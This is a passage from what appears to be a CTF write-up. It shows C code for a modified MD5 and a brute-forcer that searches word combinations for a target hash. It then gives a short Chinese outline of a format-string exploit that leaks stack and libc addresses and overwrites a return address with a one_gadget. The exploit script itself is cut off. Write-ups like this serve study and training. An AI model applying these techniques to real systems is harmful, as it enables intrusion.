class="hljs-meta">  }</span></span><br><span class="line"><span class="hljs-meta">#<span class="hljs-meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="hljs-meta">#<span class="hljs-meta-keyword">ifndef</span> PUT_ULONG_LE</span></span><br><span class="line"><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> PUT_ULONG_LE(n, b, i)                                                  \</span></span><br><span class="line"><span class="hljs-meta">  {                                                                            \</span></span><br><span class="line"><span class="hljs-meta">    (b)[(i)] = (unsigned char)((n));                                           \</span></span><br><span class="line"><span class="hljs-meta">    (b)[(i) + 1] = (unsigned char)((n) &gt;&gt; 8);                                  \</span></span><br><span class="line"><span class="hljs-meta">    (b)[(i) + 2] = (unsigned char)((n) &gt;&gt; 16);                                 \</span></span><br><span class="line"><span class="hljs-meta">    (b)[(i) + 3] = (unsigned char)((n) &gt;&gt; 24);                                 \</span></span><br><span class="line"><span class="hljs-meta">  }</span></span><br><span class="line"><span class="hljs-meta">#<span class="hljs-meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="hljs-comment">/*</span></span><br><span class="line"><span class="hljs-comment"> * MD5 context setup</span></span><br><span class="line"><span class="hljs-comment"> */</span></span><br><span class="line"><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">md5_starts</span><span class="hljs-params">(md5_context *ctx)</span> </span>{</span><br><span class="line">  ctx-&gt;total[<span class="hljs-number">0</span>] = <span class="hljs-number">0</span>;</span><br><span class="line">  ctx-&gt;total[<span class="hljs-number">1</span>] = <span class="hljs-number">0</span>;</span><br><span class="line"></span><br><span class="line">  ctx-&gt;state[<span class="hljs-number">0</span>] = <span class="hljs-number">0xEFCDAB89</span>;</span><br><span class="line">  ctx-&gt;state[<span class="hljs-number">1</span>] = <span class="hljs-number">0x67452301</span>;</span><br><span class="line">  ctx-&gt;state[<span class="hljs-number">2</span>] = <span class="hljs-number">0x10325476</span>;</span><br><span class="line">  ctx-&gt;state[<span class="hljs-number">3</span>] = <span class="hljs-number">0x98BADCFE</span>;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">md5_process</span><span class="hljs-params">(md5_context *ctx, <span class="hljs-keyword">const</span> <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">char</span> data[<span class="hljs-number">64</span>])</span> </span>{</span><br><span class="line">  <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span> X[<span class="hljs-number">16</span>], A, B, C, D;</span><br><span class="line"></span><br><span class="line">  GET_ULONG_LE(X[<span class="hljs-number">0</span>], data, <span class="hljs-number">0</span>);</span><br><span class="line">  GET_ULONG_LE(X[<span class="hljs-number">1</span>], data, <span class="hljs-number">4</span>);</span><br><span class="line">  GET_ULONG_LE(X[<span class="hljs-number">2</span>], data, <span class="hljs-number">8</span>);</span><br><span class="line">  GET_ULONG_LE(X[<span class="hljs-number">3</span>], data, <span class="hljs-number">12</span>);</span><br><span class="line">  GET_ULONG_LE(X[<span class="hljs-number">4</span>], data, <span class="hljs-number">16</span>);</span><br><span class="line">  GET_ULONG_LE(X[<span class="hljs-number">5</span>], data, <span class="hljs-number">20</span>);</span><br><span class="line">  GET_ULONG_LE(X[<span class="hljs-number">6</span>], data, <span class="hljs-number">24</span>);</span><br><span class="line">  GET_ULONG_LE(X[<span class="hljs-number">7</span>], data, <span class="hljs-number">28</span>);</span><br><span class="line">  GET_ULONG_LE(X[<span class="hljs-number">8</span>], data, <span class="hljs-number">32</span>);</span><br><span class="line">  GET_ULONG_LE(X[<span class="hljs-number">9</span>], data, <span class="hljs-number">36</span>);</span><br><span class="line">  GET_ULONG_LE(X[<span class="hljs-number">10</span>], data, <span class="hljs-number">40</span>);</span><br><span class="line">  GET_ULONG_LE(X[<span class="hljs-number">11</span>], data, <span class="hljs-number">44</span>);</span><br><span class="line">  GET_ULONG_LE(X[<span class="hljs-number">12</span>], data, <span class="hljs-number">48</span>);</span><br><span class="line">  GET_ULONG_LE(X[<span class="hljs-number">13</span>], data, <span class="hljs-number">52</span>);</span><br><span class="line">  GET_ULONG_LE(X[<span class="hljs-number">14</span>], data, <span class="hljs-number">56</span>);</span><br><span class="line">  GET_ULONG_LE(X[<span class="hljs-number">15</span>], data, <span class="hljs-number">60</span>);</span><br><span class="line"></span><br><span class="line"><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> S(x, n) ((x <span class="hljs-meta-string">&lt;&lt; n) | ((x &amp; 0xFFFFFFFF) &gt;</span>&gt; (32 - n)))</span></span><br><span class="line"></span><br><span class="line"><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> P(a, b, c, d, k, s, t)                                                 \</span></span><br><span class="line"><span class="hljs-meta">  {                                                                            \</span></span><br><span class="line"><span class="hljs-meta">    a += F(b, c, d) + X[k] + t;                                                \</span></span><br><span class="line"><span class="hljs-meta">    a = S(a, s) + b;                                                           \</span></span><br><span class="line"><span class="hljs-meta">  }</span></span><br><span class="line"></span><br><span class="line">  A = ctx-&gt;state[<span class="hljs-number">0</span>];</span><br><span class="line">  B = ctx-&gt;state[<span class="hljs-number">1</span>];</span><br><span class="line">  C = ctx-&gt;state[<span class="hljs-number">2</span>];</span><br><span class="line">  D = ctx-&gt;state[<span class="hljs-number">3</span>];</span><br><span class="line"></span><br><span class="line"><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> F(x, y, z) (~(~z | x) | (x &amp; y))</span></span><br><span class="line"></span><br><span class="line">  P(A, B, C, D, <span class="hljs-number">0</span>, <span class="hljs-number">7</span>, <span class="hljs-number">0xD76AA478</span>);</span><br><span class="line">  P(D, A, B, C, <span class="hljs-number">1</span>, <span class="hljs-number">12</span>, <span class="hljs-number">0xE8C7B756</span>);</span><br><span class="line">  P(C, D, A, B, <span class="hljs-number">2</span>, <span class="hljs-number">17</span>, <span class="hljs-number">0x242070DB</span>);</span><br><span class="line">  P(B, C, D, A, <span class="hljs-number">3</span>, <span class="hljs-number">22</span>, <span class="hljs-number">0xC1BDCEEE</span>);</span><br><span class="line">  P(A, B, C, D, <span class="hljs-number">4</span>, <span class="hljs-number">7</span>, <span class="hljs-number">0xF57C0FAF</span>);</span><br><span class="line">  P(D, A, B, C, <span class="hljs-number">5</span>, <span class="hljs-number">12</span>, <span class="hljs-number">0x4787C62A</span>);</span><br><span class="line">  P(C, D, A, B, <span class="hljs-number">6</span>, <span class="hljs-number">17</span>, <span class="hljs-number">0xA8304613</span>);</span><br><span class="line">  P(B, C, D, A, <span class="hljs-number">7</span>, <span class="hljs-number">22</span>, <span class="hljs-number">0xFD469501</span>);</span><br><span class="line">  P(A, B, C, D, <span class="hljs-number">8</span>, <span class="hljs-number">7</span>, <span class="hljs-number">0x698098D8</span>);</span><br><span class="line">  P(D, A, B, C, <span class="hljs-number">9</span>, <span class="hljs-number">12</span>, <span class="hljs-number">0x8B44F7AF</span>);</span><br><span class="line">  P(C, D, A, B, <span class="hljs-number">10</span>, <span class="hljs-number">17</span>, <span class="hljs-number">0xFFFF5BB1</span>);</span><br><span class="line">  P(B, C, D, A, <span class="hljs-number">11</span>, <span class="hljs-number">22</span>, <span class="hljs-number">0x895CD7BE</span>);</span><br><span class="line">  P(A, B, C, D, <span class="hljs-number">12</span>, <span class="hljs-number">7</span>, <span class="hljs-number">0x6B901122</span>);</span><br><span class="line">  P(D, A, B, C, <span class="hljs-number">13</span>, <span class="hljs-number">12</span>, <span class="hljs-number">0xFD987193</span>);</span><br><span class="line">  P(C, D, A, B, <span class="hljs-number">14</span>, <span class="hljs-number">17</span>, <span class="hljs-number">0xA679438E</span>);</span><br><span class="line">  P(B, C, D, A, <span class="hljs-number">15</span>, <span class="hljs-number">22</span>, <span class="hljs-number">0x49B40821</span>);</span><br><span class="line"></span><br><span class="line"><span class="hljs-meta">#<span class="hljs-meta-keyword">undef</span> F</span></span><br><span class="line"></span><br><span class="line"><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> F(x, y, z) (~(z | ~y) | (z &amp; x))</span></span><br><span class="line"></span><br><span class="line">  P(A, B, C, D, <span class="hljs-number">1</span>, <span class="hljs-number">5</span>, <span class="hljs-number">0xF61E2562</span>);</span><br><span class="line">  P(D, A, B, C, <span class="hljs-number">6</span>, <span class="hljs-number">9</span>, <span class="hljs-number">0xC040B340</span>);</span><br><span class="line">  P(C, D, A, B, <span class="hljs-number">11</span>, <span class="hljs-number">14</span>, <span class="hljs-number">0x265E5A51</span>);</span><br><span class="line">  P(B, C, D, A, <span class="hljs-number">0</span>, <span class="hljs-number">20</span>, <span class="hljs-number">0xE9B6C7AA</span>);</span><br><span class="line">  P(A, B, C, D, <span class="hljs-number">5</span>, <span class="hljs-number">5</span>, <span class="hljs-number">0xD62F105D</span>);</span><br><span class="line">  P(D, A, B, C, <span class="hljs-number">10</span>, <span class="hljs-number">9</span>, <span class="hljs-number">0x02441453</span>);</span><br><span class="line">  P(C, D, A, B, <span class="hljs-number">15</span>, <span class="hljs-number">14</span>, <span class="hljs-number">0xD8A1E681</span>);</span><br><span class="line">  P(B, C, D, A, <span class="hljs-number">4</span>, <span class="hljs-number">20</span>, <span class="hljs-number">0xE7D3FBC8</span>);</span><br><span class="line">  P(A, B, C, D, <span class="hljs-number">9</span>, <span class="hljs-number">5</span>, <span class="hljs-number">0x21E1CDE6</span>);</span><br><span class="line">  P(D, A, B, C, <span class="hljs-number">14</span>, <span class="hljs-number">9</span>, <span class="hljs-number">0xC33707D6</span>);</span><br><span class="line">  P(C, D, A, B, <span class="hljs-number">3</span>, <span class="hljs-number">14</span>, <span class="hljs-number">0xF4D50D87</span>);</span><br><span class="line">  P(B, C, D, A, <span class="hljs-number">8</span>, <span class="hljs-number">20</span>, <span class="hljs-number">0x455A14ED</span>);</span><br><span class="line">  P(A, B, C, D, <span class="hljs-number">13</span>, <span class="hljs-number">5</span>, <span class="hljs-number">0xA9E3E905</span>);</span><br><span class="line">  P(D, A, B, C, <span class="hljs-number">2</span>, <span class="hljs-number">9</span>, <span class="hljs-number">0xFCEFA3F8</span>);</span><br><span class="line">  P(C, D, A, B, <span class="hljs-number">7</span>, <span class="hljs-number">14</span>, <span class="hljs-number">0x676F02D9</span>);</span><br><span class="line">  P(B, C, D, A, <span class="hljs-number">12</span>, <span class="hljs-number">20</span>, <span class="hljs-number">0x8D2A4C8A</span>);</span><br><span class="line"></span><br><span class="line"><span class="hljs-meta">#<span class="hljs-meta-keyword">undef</span> F</span></span><br><span class="line"></span><br><span class="line"><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> F(x, y, z) (x ^ y ^ z)</span></span><br><span class="line"></span><br><span class="line">  P(A, B, C, D, <span class="hljs-number">5</span>, <span class="hljs-number">4</span>, <span class="hljs-number">0xFFFA3942</span>);</span><br><span class="line">  P(D, A, B, C, <span class="hljs-number">8</span>, <span class="hljs-number">11</span>, <span class="hljs-number">0x8771F681</span>);</span><br><span class="line">  P(C, D, A, B, <span class="hljs-number">11</span>, <span class="hljs-number">16</span>, <span class="hljs-number">0x6D9D6122</span>);</span><br><span class="line">  P(B, C, D, A, <span class="hljs-number">14</span>, <span class="hljs-number">23</span>, <span class="hljs-number">0xFDE5380C</span>);</span><br><span class="line">  P(A, B, C, D, <span class="hljs-number">1</span>, <span class="hljs-number">4</span>, <span class="hljs-number">0xA4BEEA44</span>);</span><br><span class="line">  P(D, A, B, C, <span class="hljs-number">4</span>, <span class="hljs-number">11</span>, <span class="hljs-number">0x4BDECFA9</span>);</span><br><span class="line">  P(C, D, A, B, <span class="hljs-number">7</span>, <span class="hljs-number">16</span>, <span class="hljs-number">0xF6BB4B60</span>);</span><br><span class="line">  P(B, C, D, A, <span class="hljs-number">10</span>, <span class="hljs-number">23</span>, <span class="hljs-number">0xBEBFBC70</span>);</span><br><span class="line">  P(A, B, C, D, <span class="hljs-number">13</span>, <span class="hljs-number">4</span>, <span class="hljs-number">0x289B7EC6</span>);</span><br><span class="line">  P(D, A, B, C, <span class="hljs-number">0</span>, <span class="hljs-number">11</span>, <span class="hljs-number">0xEAA127FA</span>);</span><br><span class="line">  P(C, D, A, B, <span class="hljs-number">3</span>, <span class="hljs-number">16</span>, <span class="hljs-number">0xD4EF3085</span>);</span><br><span class="line">  P(B, C, D, A, <span class="hljs-number">6</span>, <span class="hljs-number">23</span>, <span class="hljs-number">0x04881D05</span>);</span><br><span class="line">  P(A, B, C, D, <span class="hljs-number">9</span>, <span class="hljs-number">4</span>, <span class="hljs-number">0xD9D4D039</span>);</span><br><span class="line">  P(D, A, B, C, <span class="hljs-number">12</span>, <span class="hljs-number">11</span>, <span class="hljs-number">0xE6DB99E5</span>);</span><br><span class="line">  P(C, D, A, B, <span class="hljs-number">15</span>, <span class="hljs-number">16</span>, <span class="hljs-number">0x1FA27CF8</span>);</span><br><span class="line">  P(B, C, D, A, <span class="hljs-number">2</span>, <span class="hljs-number">23</span>, <span class="hljs-number">0xC4AC5665</span>);</span><br><span class="line"></span><br><span class="line"><span class="hljs-meta">#<span class="hljs-meta-keyword">undef</span> F</span></span><br><span class="line"></span><br><span class="line"><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> F(x, y, z) (y ^ (x | ~z))</span></span><br><span class="line"></span><br><span class="line">  P(A, B, C, D, <span class="hljs-number">0</span>, <span class="hljs-number">6</span>, <span class="hljs-number">0xF4292244</span>);</span><br><span class="line">  P(D, A, B, C, <span class="hljs-number">7</span>, <span class="hljs-number">10</span>, <span class="hljs-number">0x432AFF97</span>);</span><br><span class="line">  P(C, D, A, B, <span class="hljs-number">14</span>, <span class="hljs-number">15</span>, <span class="hljs-number">0xAB9423A7</span>);</span><br><span class="line">  P(B, C, D, A, <span class="hljs-number">5</span>, <span class="hljs-number">21</span>, <span class="hljs-number">0xFC93A039</span>);</span><br><span class="line">  P(A, B, C, D, <span class="hljs-number">12</span>, <span class="hljs-number">6</span>, <span class="hljs-number">0x655B59C3</span>);</span><br><span class="line">  P(D, A, B, C, <span class="hljs-number">3</span>, <span class="hljs-number">10</span>, <span class="hljs-number">0x8F0CCC92</span>);</span><br><span class="line">  P(C, D, A, B, <span class="hljs-number">10</span>, <span class="hljs-number">15</span>, <span class="hljs-number">0xFFEFF47D</span>);</span><br><span class="line">  P(B, C, D, A, <span class="hljs-number">1</span>, <span class="hljs-number">21</span>, <span class="hljs-number">0x85845DD1</span>);</span><br><span class="line">  P(A, B, C, D, <span class="hljs-number">8</span>, <span class="hljs-number">6</span>, <span class="hljs-number">0x6FA87E4F</span>);</span><br><span class="line">  P(D, A, B, C, <span class="hljs-number">15</span>, <span class="hljs-number">10</span>, <span class="hljs-number">0xFE2CE6E0</span>);</span><br><span class="line">  P(C, D, A, B, <span class="hljs-number">6</span>, <span class="hljs-number">15</span>, <span class="hljs-number">0xA3014314</span>);</span><br><span class="line">  P(B, C, D, A, <span class="hljs-number">13</span>, <span class="hljs-number">21</span>, <span class="hljs-number">0x4E0811A1</span>);</span><br><span class="line">  P(A, B, C, D, <span class="hljs-number">4</span>, <span class="hljs-number">6</span>, <span class="hljs-number">0xF7537E82</span>);</span><br><span class="line">  P(D, A, B, C, <span class="hljs-number">11</span>, <span class="hljs-number">10</span>, <span class="hljs-number">0xBD3AF235</span>);</span><br><span class="line">  P(C, D, A, B, <span class="hljs-number">2</span>, <span class="hljs-number">15</span>, <span class="hljs-number">0x2AD7D2BB</span>);</span><br><span class="line">  P(B, C, D, A, <span class="hljs-number">9</span>, <span class="hljs-number">21</span>, <span class="hljs-number">0xEB86D391</span>);</span><br><span class="line"></span><br><span class="line"><span class="hljs-meta">#<span class="hljs-meta-keyword">undef</span> F</span></span><br><span class="line"></span><br><span class="line">  ctx-&gt;state[<span class="hljs-number">0</span>] += A;</span><br><span class="line">  ctx-&gt;state[<span class="hljs-number">1</span>] += B;</span><br><span class="line">  ctx-&gt;state[<span class="hljs-number">2</span>] += C;</span><br><span class="line">  ctx-&gt;state[<span class="hljs-number">3</span>] += D;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="hljs-comment">/*</span></span><br><span class="line"><span class="hljs-comment"> * MD5 process buffer</span></span><br><span class="line"><span class="hljs-comment"> */</span></span><br><span class="line"><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">md5_update</span><span class="hljs-params">(md5_context *ctx, <span class="hljs-keyword">const</span> <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">char</span> *input, <span class="hljs-keyword">int</span> ilen)</span> </span>{</span><br><span class="line">  <span class="hljs-keyword">int</span> fill;</span><br><span class="line">  <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span> left;</span><br><span class="line"></span><br><span class="line">  <span class="hljs-keyword">if</span> (ilen &lt;= <span class="hljs-number">0</span>)</span><br><span class="line">    <span class="hljs-keyword">return</span>;</span><br><span class="line"></span><br><span class="line">  left = ctx-&gt;total[<span class="hljs-number">0</span>] &amp; <span class="hljs-number">0x3F</span>;</span><br><span class="line">  fill = <span class="hljs-number">64</span> - left;</span><br><span class="line"></span><br><span class="line">  ctx-&gt;total[<span class="hljs-number">0</span>] += ilen;</span><br><span class="line">  ctx-&gt;total[<span class="hljs-number">0</span>] &amp;= <span class="hljs-number">0xFFFFFFFF</span>;</span><br><span class="line"></span><br><span class="line">  <span class="hljs-keyword">if</span> (ctx-&gt;total[<span class="hljs-number">0</span>] &lt; (<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span>)ilen)</span><br><span class="line">    ctx-&gt;total[<span class="hljs-number">1</span>]++;</span><br><span class="line"></span><br><span class="line">  <span class="hljs-keyword">if</span> (left &amp;&amp; ilen &gt;= fill) {</span><br><span class="line">    <span class="hljs-built_in">memcpy</span>((<span class="hljs-keyword">void</span> *)(ctx-&gt;buffer + left), input, fill);</span><br><span class="line">    md5_process(ctx, ctx-&gt;buffer);</span><br><span class="line">    input += fill;</span><br><span class="line">    ilen -= fill;</span><br><span class="line">    left = <span class="hljs-number">0</span>;</span><br><span class="line">  }</span><br><span class="line"></span><br><span class="line">  <span class="hljs-keyword">while</span> (ilen &gt;= <span class="hljs-number">64</span>) {</span><br><span class="line">    md5_process(ctx, input);</span><br><span class="line">    input += <span class="hljs-number">64</span>;</span><br><span class="line">    ilen -= <span class="hljs-number">64</span>;</span><br><span class="line">  }</span><br><span class="line"></span><br><span class="line">  <span class="hljs-keyword">if</span> (ilen &gt; <span class="hljs-number">0</span>) {</span><br><span class="line">    <span class="hljs-built_in">memcpy</span>((<span class="hljs-keyword">void</span> *)(ctx-&gt;buffer + left), input, ilen);</span><br><span class="line">  }</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="hljs-keyword">static</span> <span class="hljs-keyword">const</span> <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">char</span> md5_padding[<span class="hljs-number">64</span>] = {</span><br><span class="line">    <span class="hljs-number">0x80</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>,</span><br><span class="line">    <span class="hljs-number">0</span>,    <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>,</span><br><span class="line">    <span class="hljs-number">0</span>,    <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>};</span><br><span class="line"></span><br><span class="line"><span class="hljs-comment">/*</span></span><br><span class="line"><span class="hljs-comment"> * MD5 final digest</span></span><br><span class="line"><span class="hljs-comment"> */</span></span><br><span class="line"><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">md5_finish</span><span class="hljs-params">(md5_context *ctx, <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">char</span> output[<span class="hljs-number">16</span>])</span> </span>{</span><br><span class="line">  <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span> last, padn;</span><br><span class="line">  <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span> high, low;</span><br><span class="line">  <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">char</span> msglen[<span class="hljs-number">8</span>];</span><br><span class="line"></span><br><span class="line">  high = (ctx-&gt;total[<span class="hljs-number">0</span>] &gt;&gt; <span class="hljs-number">29</span>) | (ctx-&gt;total[<span class="hljs-number">1</span>] &lt;&lt; <span class="hljs-number">3</span>);</span><br><span class="line">  low = (ctx-&gt;total[<span class="hljs-number">0</span>] &lt;&lt; <span class="hljs-number">3</span>);</span><br><span class="line"></span><br><span class="line">  PUT_ULONG_LE(low, msglen, <span class="hljs-number">0</span>);</span><br><span class="line">  PUT_ULONG_LE(high, msglen, <span class="hljs-number">4</span>);</span><br><span class="line"></span><br><span class="line">  last = ctx-&gt;total[<span class="hljs-number">0</span>] &amp; <span class="hljs-number">0x3F</span>;</span><br><span class="line">  padn = (last &lt; <span class="hljs-number">56</span>) ? (<span class="hljs-number">56</span> - last) : (<span class="hljs-number">120</span> - last);</span><br><span class="line"></span><br><span class="line">  md5_update(ctx, md5_padding, padn);</span><br><span class="line">  md5_update(ctx, msglen, <span class="hljs-number">8</span>);</span><br><span class="line"></span><br><span class="line">  PUT_ULONG_LE(ctx-&gt;state[<span class="hljs-number">0</span>], output, <span class="hljs-number">0</span>);</span><br><span class="line">  PUT_ULONG_LE(ctx-&gt;state[<span class="hljs-number">1</span>], output, <span class="hljs-number">4</span>);</span><br><span class="line">  PUT_ULONG_LE(ctx-&gt;state[<span class="hljs-number">2</span>], output, <span class="hljs-number">8</span>);</span><br><span class="line">  PUT_ULONG_LE(ctx-&gt;state[<span class="hljs-number">3</span>], output, <span class="hljs-number">12</span>);</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="hljs-comment">/*</span></span><br><span class="line"><span class="hljs-comment"> * output = MD5( input buffer )</span></span><br><span class="line"><span class="hljs-comment"> */</span></span><br><span class="line"><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">md5</span><span class="hljs-params">(<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">char</span> *input, <span class="hljs-keyword">int</span> ilen, <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">char</span> output[<span class="hljs-number">16</span>])</span> </span>{</span><br><span class="line">  md5_context ctx;</span><br><span class="line">  <span class="hljs-built_in">memset</span>(&amp;ctx, <span class="hljs-number">0</span>, <span class="hljs-keyword">sizeof</span>(md5_context));</span><br><span class="line">  md5_starts(&amp;ctx);</span><br><span class="line">  md5_update(&amp;ctx, input, ilen);</span><br><span class="line">  md5_finish(&amp;ctx, output);</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="hljs-keyword">char</span> charset[<span class="hljs-number">6</span>][<span class="hljs-number">7</span>] = {<span class="hljs-string">"cat"</span>, <span class="hljs-string">"dog"</span>, <span class="hljs-string">"fox"</span>, <span class="hljs-string">"panda"</span>, <span class="hljs-string">"dragon"</span>, <span class="hljs-string">"monkey"</span>};</span><br><span class="line"><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span> </span>{</span><br><span class="line">  <span class="hljs-comment">// for (int i = 0; i &lt; 16; i++) {</span></span><br><span class="line">  <span class="hljs-comment">//   res[i] ^= 0x16;</span></span><br><span class="line">  <span class="hljs-comment">//   printf("%02x", res[i]);</span></span><br><span class="line">  <span class="hljs-comment">// }</span></span><br><span class="line">  <span class="hljs-comment">// printf("\n");</span></span><br><span class="line">  <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> a = <span class="hljs-number">0</span>; a &lt; <span class="hljs-number">6</span>; a++) {</span><br><span class="line">    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> b = <span class="hljs-number">0</span>; b &lt; <span class="hljs-number">6</span>; b++) {</span><br><span class="line">      <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> c = <span class="hljs-number">0</span>; c &lt; <span class="hljs-number">6</span>; c++) {</span><br><span class="line">        <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> d = <span class="hljs-number">0</span>; d &lt; <span class="hljs-number">6</span>; d++) {</span><br><span class="line">          <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> e = <span class="hljs-number">0</span>; e &lt; <span class="hljs-number">6</span>; e++) {</span><br><span class="line">            <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> f = <span class="hljs-number">0</span>; f &lt; <span class="hljs-number">6</span>; f++) {</span><br><span class="line">              <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> g = <span class="hljs-number">0</span>; g &lt; <span class="hljs-number">6</span>; g++) {</span><br><span class="line">                <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> h = <span class="hljs-number">0</span>; h &lt; <span class="hljs-number">6</span>; h++) {</span><br><span class="line">                  <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">6</span>; i++) {</span><br><span class="line">                    <span class="hljs-keyword">char</span> buf[<span class="hljs-number">1000</span>];</span><br><span class="line">                    <span class="hljs-built_in">memset</span>(buf, <span class="hljs-number">0</span>, <span class="hljs-number">1000</span>);</span><br><span class="line">                    <span class="hljs-built_in">strcpy</span>(buf, charset[a]);</span><br><span class="line">                    <span class="hljs-built_in">strcat</span>(buf, charset[b]);</span><br><span class="line">                    <span class="hljs-built_in">strcat</span>(buf, charset[c]);</span><br><span class="line">                    <span class="hljs-built_in">strcat</span>(buf, charset[d]);</span><br><span class="line">                    <span class="hljs-built_in">strcat</span>(buf, charset[e]);</span><br><span class="line">                    <span class="hljs-built_in">strcat</span>(buf, charset[f]);</span><br><span class="line">                    <span class="hljs-built_in">strcat</span>(buf, charset[g]);</span><br><span class="line">                    <span class="hljs-built_in">strcat</span>(buf, charset[h]);</span><br><span class="line">                    <span class="hljs-built_in">strcat</span>(buf, charset[i]);</span><br><span class="line">                    <span class="hljs-built_in">printf</span>(<span class="hljs-string">"Try: %s\n"</span>, buf);</span><br><span class="line">                    <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">char</span> output[<span class="hljs-number">200</span>];</span><br><span class="line">                    md5(buf, <span class="hljs-built_in">strlen</span>(buf), output);</span><br><span class="line">                    <span class="hljs-keyword">if</span> (!<span class="hljs-built_in">memcmp</span>(output, res, <span class="hljs-number">16</span>)) {</span><br><span class="line">                      <span class="hljs-built_in">printf</span>(<span class="hljs-string">"======= Found: %s\n"</span>, buf);</span><br><span class="line">                      <span class="hljs-built_in">printf</span>(<span class="hljs-string">"%d%d%d%d%d%d%d%d%d\n"</span>, a, b, c, d, e, f, g, h, i);</span><br><span class="line">                      <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;</span><br><span class="line">                    }</span><br><span class="line">                  }</span><br><span class="line">                }</span><br><span class="line">              }</span><br><span class="line">            }</span><br><span class="line">          }</span><br><span class="line">        }</span><br><span class="line">      }</span><br><span class="line">    }</span><br><span class="line">  }</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><h1 id="pwn"><a href="#pwn" class="headerlink" title="pwn"></a>pwn</h1><h2 id="fmt"><a href="#fmt" class="headerlink" title="fmt"></a>fmt</h2><p>两次格式化字符串，一次泄露栈地址和libc地址，一次写，给了libc，可以向返回地址里写one_gadget</p><figure class="highlight python hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span 